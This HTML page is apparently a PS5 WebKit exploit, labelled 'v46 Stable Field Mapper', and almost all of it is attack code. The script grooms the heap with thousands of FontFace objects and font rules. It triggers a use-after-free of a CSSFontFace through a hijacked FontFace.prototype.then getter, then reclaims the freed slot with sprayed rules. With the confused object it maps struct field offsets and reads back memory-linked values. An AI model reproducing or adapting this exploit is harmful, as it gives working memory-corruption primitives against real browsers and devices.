<!DOCTYPE html>
<!-- PS5 WebKit CSSFontFace UAF – v46 Stable Field Mapper -->
<html>
<head>
<meta charset="utf-8">
<title>PS5 v46 – Struct Field Mapper</title>

<!-- Preloaded font-face rules:
     "prepad" ensures a valid font for the UAF heap layout,
     "x" is the target rule that will be deleted to free the CSSFontFace -->
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
</style>
</head>
<body>
<div id="out"></div>
<script>
"use strict";

// ---- DOM logger helpers ----
var O=document.getElementById("out");
function P(m,c){var s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
function Dm(m){P("  "+m,"dm")}function Hd(m){P("▸ "+m,"hd")}

// ---- Font binary helper (dummy WOFF) ----
var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}

// ---- Forced layout tick (triggers font loading) ----
function fs(){try{void document.body.offsetTop}catch(e){}}

var sh=document.getElementById("s").sheet;
var keep=[],holes=[],trigger=null,uafOk=false;

// Phase 1: Create 4096 FontFace objects, then delete every other one
// to create predictable holes in the CSSFontFace IsoHeap.
for(var i=0;i<4096;i++){
    try{
        var f=new FontFace("h_"+i,mkBuf(),{
            unicodeRange:"U+E1"+(i%16).toString(16),
            style:i%2===0?"normal":"italic",
            weight:String(100+(i%9)*100)
        });
        document.fonts.add(f);
        holes.push(f);
    }catch(e){}
}
fs();
for(var i=1;i<holes.length;i+=2) try{document.fonts.delete(holes[i])}catch(e){}
fs();

// The trigger: a FontFace that will fire the UAF via .then()
trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(trigger);
void trigger.loaded; // activate the FontFace (creates backing CSSFontFace)

// Extra rules to fill the heap with allocations that can be freed later
for(var i=0;i<48;i++) try{
    sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length);
}catch(e){}
fs();

// A second stylesheet for flush rules (768 rules)
var fst=document.createElement("style");document.head.appendChild(fst);
var fsh=fst.sheet;
for(var i=0;i<768;i++) try{
    fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length);
}catch(e){}
fs();

// The UAF trigger: override FontFace.prototype.then to execute
// inside the Promise chain of document.fonts.load().
Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get:function(){
    if(this===trigger && !uafOk){
        uafOk=true;
        try{
            // Keep a reference to a new FontFace so it isn't GC'd early
            var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
            document.fonts.add(ck);
            keep.push(ck);
            
            // Delete the CSS rule for family "x" – this frees the CSSFontFace
            sh.deleteRule(1);
            fs();
            
            // Delete all flush rules to create more free blocks
            while(fsh.cssRules.length) try{fsh.deleteRule(0)}catch(e){}
            fs();
            
            // Delete additional hole FontFaces
            for(var i=0;i<holes.length;i+=4) try{document.fonts.delete(holes[i])}catch(e){}
            fs();
        }catch(e){}
        
        // Memory pressure: allocate 4 arrays of 128 ArrayBuffers (8KB each)
        for(var i=0;i<4;i++){
            var t=[];
            for(var j=0;j<128;j++) t.push(new ArrayBuffer(8192));
        }
        
        // Spray 2048 @font-face rules via insertRule to reclaim the freed slot.
        // Each rule creates a new CSSFontFace in WebKit's heap.
        // The one that lands in the slot of "x" will be accessible via the dangling selector.
        for(var i=0;i<2048;i++){
            try{
                sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+
                    (100+(i%9)*100)+";font-style:"+(i%2===0?"normal":"italic")+
                    ";unicode-range:U+0042}",sh.cssRules.length);
            }catch(e){}
        }
        fs();
        
        // Force a layout with a sample text element to trigger font loading
        try{
            var d=document.createElement("div");
            d.textContent="AB";
            d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
            document.body.appendChild(d);
            void d.offsetWidth;
        }catch(e){}
    }
    return undefined; // .then() expects a function, we return undefined (non-callable)
}});

// Phase 2: Load the mixed font stack. The dangling selector for "x" will
// point to one of our A_* CSSFontFace objects. We receive the matching FontFace.
document.fonts.load("1em trigger, x", "AB").then(function(faces){
    var aFamily = null, aFace = null;
    for(var i=0;i<faces.length;i++){
        if(faces[i].family && faces[i].family.indexOf("A_")===0){
            aFamily=faces[i].family;
            aFace=faces[i];
        }
    }
    if(!aFamily) return;
    St("RECLAIMED: "+aFamily); // the confused FontFace
    keep.push(faces);
    
    // Find the CSSRule that owns this FontFace to allow read/write
    var aIndex = -1;
    for(var i=0;i<sh.cssRules.length;i++){
        try{
            var r=sh.cssRules[i];
            if(r.type===5 && r.style.getPropertyValue("font-family").indexOf(aFamily)!==-1){
                aIndex=i; break;
            }
        }catch(e){}
    }
    if(aIndex===-1) return;
    var aRule=sh.cssRules[aIndex], aStyle=aRule.style;
    
    // Quick liveness test: write weight=700, read back via the FontFace
    aStyle.setProperty("font-weight","700"); fs();
    if(String(aFace.weight)!=="700") return;
    Ok("Confusion ALIVE");
    
    // ---- Struct field mapper ----
    // Writes a value via CSSRule.style and reads back through the FontFace property.
    // If they match, propagation channel exists at the expected offset.
    function syncProbe(cssName, writeVal, faceProp, expectedOff, desc, type){
        aStyle.setProperty(cssName, writeVal); fs();
        var readVal = aFace[faceProp];
        var readStr = String(readVal), writeStr = String(writeVal);
        var propagated = false;
        if(type==="numeric"){
            var rn=parseFloat(readStr), wn=parseFloat(writeVal);
            if(!isNaN(rn) && !isNaN(wn) && rn===wn) propagated=true;
            if(readStr.indexOf(writeStr)!==-1) propagated=true;
        }else if(type==="float"){
            var fv=parseFloat(readStr), wv=parseFloat(writeVal);
            if(!isNaN(fv) && !isNaN(wv) && Math.abs(fv-wv)<0.01) propagated=true;
        }else{
            if(readStr.indexOf(writeStr)!==-1) propagated=true;
        }
        if(propagated) Ok("    read: "+readStr+" ✓");
        else Fl("    read: "+readStr+" ✗");
        try{aStyle.removeProperty(cssName)}catch(e){}
        fs();
    }
    
    // Probe font-weight (offset 0x88) – the most reliable channel
    var weights=[100,200,300,400,500,600,700,800,900];
    for(var wi=0; wi<weights.length; wi++)
        syncProbe("font-weight", String(weights[wi]), "weight", "0x88", "weight", "numeric");
    
    // Other channels
    syncProbe("font-family", "testFamProbe", "family", "0x20", "m_family", "string");
    syncProbe("unicode-range", "U+0000-007F", "unicodeRange", "0x28", "m_ranges", "string");
    syncProbe("font-feature-settings", "\"test\" 1", "featureSettings", "0x40", "m_featureSettings", "string");
    syncProbe("font-display", "block", "display", "0x58", "loadingBehavior", "enum");
    syncProbe("font-display", "swap", "display", "0x58", "loadingBehavior", "enum");
    syncProbe("font-display", "fallback", "display", "0x58", "loadingBehavior", "enum");
    syncProbe("font-display", "optional", "display", "0x58", "loadingBehavior", "enum");
    syncProbe("font-stretch", "condensed", "stretch", "0x88+4", "width", "string");
    syncProbe("font-stretch", "expanded", "stretch", "0x88+4", "width", "string");
    syncProbe("font-style", "italic", "style", "0x88+8", "slope", "string");
});
</script>
</body>
</html>
